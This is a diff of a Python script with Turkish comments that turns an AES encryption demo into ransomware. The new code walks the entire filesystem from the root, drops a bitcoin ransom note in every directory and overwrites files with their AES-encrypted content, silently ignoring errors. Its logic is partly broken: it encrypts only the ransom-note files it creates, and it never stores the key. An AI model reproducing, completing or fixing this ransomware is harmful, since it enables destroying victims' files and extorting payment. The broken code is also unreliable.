@@ -1,48 +1,61 @@
 import os
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
 
-#Şifreleme kütüphaneleri
+# AES için 32 byte anahtar oluştur
+key = os.urandom(32)  # AES-256 için 32 byte
+iv = os.urandom(16)   # 16 byte IV
 
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-from Crypto.Random import get_random_bytes
-def encrypt(plaintext,key):
-    cipher = AES.new(key, AES.MODE_CBC)  # CBC modunda şifreleme
-    iv = cipher.iv  # Initialization Vector (IV) otomatik olarak oluşturuluyor
-    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))  # padding ile şifreleme
-    return iv + ciphertext  # IV, şifreli metinle birlikte döndürülüyor
+#  Şifreleme fonksiyonu
+def encrypt_file(filepath, key, iv):
+    try:
+        # Dosya içeriğini oku
+        with open(filepath, "rb") as file:
+            plaintext = file.read()
 
+        # PKCS7 padding ile 16 byte bloklara tamamlama
+        padder = padding.PKCS7(128).padder()
+        padded_data = padder.update(plaintext) + padder.finalize()
 
-key = get_random_bytes(16)#16 bitlik rastgele bir şifre oluşturuluyor
-plaintext = "Özlem gürses seni bulduğum yerde"
+        # AES-256 CBC ile şifreleme
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
 
-  
+        # Şifrelenmiş veriyi tekrar dosyaya yaz
+        with open(filepath, "wb") as file:
+            file.write(iv + ciphertext)  # IV başa eklenir
 
-print("orjinal metin : ",plaintext)
-sifrelenmis=encrypt(plaintext,key)
-print("Şifreli veri : ",sifrelenmis.hex())
-
-
+    except:
+        pass  # Hata olursa devam et
 
 
 def main():
     try:
         name = "readme.txt"
+        file_list = []  # Şifrelenecek dosyalar için liste
         
-        # / dizininde gezip her dizinde 'readme.txt' dosyasını oluşturmak
+        # / dizininde gezip her dizindeki dosyaları listeye ekle
         for root, dirs, files in os.walk("/"):
-            print(f"Checking directory: {root}")
             dd = os.path.join(root, name)  # Dosya yolu oluşturuluyor
 
             try:
-                # Dosyayı yazma işlemi
+                # Dosyayı oluştur ve içine mesaj yaz
                 with open(dd, "w") as file:
                     file.write("if you want to decrypt the password send 0.0015 bits to this bitcoin account")
-            
-            except PermissionError:  # Hata yakalanırsa devam et  
-                continue
 
-    except Exception as e:
-        print(f"Unexpected error: {e}")  # Herhangi bir beklenmedik hata
+                file_list.append(dd)  # Dosya listesini kaydet
+
+            except PermissionError:
+                continue  # Hata alınırsa atla
+
+        #  Listeye eklenen tüm dosyaları şifrele
+        for file_path in file_list:
+            encrypt_file(file_path, key, iv)
+
+    except:
+        pass  # Beklenmedik hata olursa devam et
 
 # Ana fonksiyonu çalıştır
 main()
